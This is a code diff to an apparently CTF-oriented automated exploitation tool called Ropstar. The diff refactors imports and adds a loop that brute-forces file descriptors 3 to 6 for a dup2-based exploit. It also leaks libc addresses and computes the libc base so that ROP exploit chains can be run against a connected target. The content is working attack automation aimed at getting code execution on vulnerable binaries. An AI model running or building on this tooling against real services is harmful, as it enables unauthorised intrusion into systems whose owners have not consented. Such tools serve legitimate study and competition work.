@@ -7,15 +7,15 @@ import re
 import argparse
 import inspect
 import pwd
-from leak import Leak
-from exploit import Exploit
-from utils import *
+from ropstar.leak import Leak
+from ropstar.exploit import Exploit
+from ropstar.utils import *
 from colorama import Fore, Back, Style
 import requests.packages.urllib3
 from importlib import import_module
 requests.packages.urllib3.disable_warnings()
 
-# Author: xct
+# Author: @xct_de
 
 class Ropstar():
     def __init__(self, argv):
@@ -384,10 +384,36 @@ class Ropstar():
         if len(leak) > 0:
             log.info("Getting libc version")
             versions = self.leak.ident_libc(leak)
-            exploits = [self.exploit.bss, self.exploit.bss_execve, self.exploit.dup2, self.exploit.default]
+            exploits = [self.exploit.bss, self.exploit.bss_execve, self.exploit.default]
+            exploits_brute_fd = [self.exploit.dup2]
+            # some of these need to repeated a few times
             for version in versions:
+                for exploit in exploits_brute_fd:
+                    for fd in [3,4,5,6]: # hacky シ
+                        p = self.connect()
+                        leak = self.smart_leak(p)
+                        if len(leak) == 0:
+                            continue
+                        log.info("Using "+version)
+                        libc_path = f"{self.leak.libcdb_path}libs/{version}/libc.so.6"
+                        log.info(libc_path)
+                        try:
+                            libc = ELF(libc_path)
+                        except IOError:
+                            log.failure("Could not load "+version+ "(skipping)")
+                            continue
+                        name, addr = list(leak.items())[0]
+                        libc.address = addr - libc.symbols[name]
+                        log.success("Libc base: {0}".format(hex(libc.address)))
+                        # exploit
+                        log.info("Running exploits")
+                        try:                   
+                            if exploit(p, libc, fd):
+                                log.success("Done!")
+                                return              
+                        except EOFError:
+                            pass
                 for exploit in exploits:
-
                     p = self.connect()
                     leak = self.smart_leak(p)
 
@@ -395,7 +421,7 @@ class Ropstar():
                         continue
                     log.info("Using "+version)
                     libc_path = f"{self.leak.libcdb_path}libs/{version}/libc.so.6"
-                    print(libc_path)
+                    log.info(libc_path)
                     try:
                         libc = ELF(libc_path)
                     except IOError:
@@ -406,7 +432,7 @@ class Ropstar():
                     log.success("Libc base: {0}".format(hex(libc.address)))
                     # exploit
                     log.info("Running exploits")
-                    try:
+                    try:                   
                         if exploit(p, libc):
                             log.success("Done!")
                             return              
